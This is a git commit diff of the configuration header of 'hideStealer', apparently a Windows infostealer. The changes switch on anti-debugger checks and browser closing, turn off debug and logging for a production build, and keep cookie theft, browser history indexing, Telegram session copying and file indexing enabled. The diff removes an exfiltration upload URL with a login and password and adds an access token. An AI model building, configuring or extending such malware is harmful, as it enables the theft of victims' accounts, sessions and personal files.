9dfe9aac14ba557d3a2ed72bac67279b3dabd2e9
EgorBeLike <nikitos.antipov.20@gmail.com>
2025-04-17 00:40:14 +0300

    Small edit

--- hideStealer/Config.h
+++ hideStealer/Config.h
@@ -1,31 +1,21 @@
 #pragma once
 
-#define DEBUGGERPROTECT  false  // Checks and exit if debugger enabled. For disable replace true to false
-#define DELETEEXE        false  // Delete exe files when steal data. For disable replace true to false
-#define PINGREQUIRED     false  // Pings and exit if no internet. For disable replace true to false
-#define ISDEBUG          true  // Enable debug mode. If this program is final result, here must be false.
+#define DEBUGGERPROTECT  true  // Checks and exit if debugger enabled. For disable replace true to false
+#define DELETEEXE        false // Delete exe files when steal data. For disable replace true to false
+#define PINGREQUIRED     true  // Pings and exit if no internet. For disable replace true to false
+#define ISDEBUG          false // Enable debug mode. If this program is final result, here must be false.
 #define ADVANCEDDEBUG    false // Displays advanced debug info if debug mode is enabled. For enable replace false to true
-#define LOGGING          true // Enable logging work. For enable replace false to true
+#define LOGGING          false // Enable logging work. For enable replace false to true
 #define INDEXDISKS       true  // Enable indexing disks. For disable replace true to false
 #define INDEXPC          true  // Enable indexing PC info. For disable replace true to false
 #define INDEXDOWNLOADS   true  // Enable indexing downloaded files. For disable replace true to false
 #define INDEXDESKTOP     true  // Enable indexing desktop files. For disable replace true to false
 #define INDEXDOCUMENTS   true  // Enable indexing documents files. For disable replace true to false
-#define CLOSECHROME      false  // Enable closing browser. Usually its not needed, but if browser data isn't readable or copyable its must be true
+#define CLOSECHROME      true  // Enable closing browser. Usually its not needed, but if browser data isn't readable or copyable its must be true
 #define INDEXHISTORY     true  // Enable indexing browser history. For disable replace true to false
 #define STEALCOOKIE      true  // Enable stealing browser cookies. For disable replace true to false
 #define PRINTHISTORY     false // Enable printing browser history. For enable replace false to true
 #define COPYTDATA        true  // Enable copy telegram session. For disable replace true to false
-#define DELORIGTDATA     false  // Enable delete original telegram session. For disable replace true to false
-#define COPYVIBER        false  // Enable copy viber session. For disable replace true to false
-#define DELORIGVIBER     false  // Enable delete original viber session. For disable replace true to false
-#define COPYMINECRAFT    true  // Enable copy minecraft session. For disable replace true to false
-#define DELORIGMINECRAFT false  // Enable delete original minecraft session. For disable replace true to false
-#define COPYSTEAM        true  // Enable copy steam session. For disable replace true to false
-#define DELORIGSTEAM     false  // Enable delete steam minecraft session. For disable replace true to false
-#define COPYROBLOX       true  // Enable copy roblox session. For disable replace true to false
-#define DELORIGROBLOX    false  // Enable delete roblox minecraft session. For disable replace true to false
+#define DELORIGTDATA     false // Enable delete original telegram session. For disable replace true to false
 
-#define URL      "https://web.141b.ru/panel/v1/upload.php"      // Server URL
-#define LOGIN    "usera"                                        // User's login
-#define PASSWORD "ewe-676-$%$"                                  // User's password
+#define TOKEN "012b2f9005594f9ad771b988b7437d7d" // Token
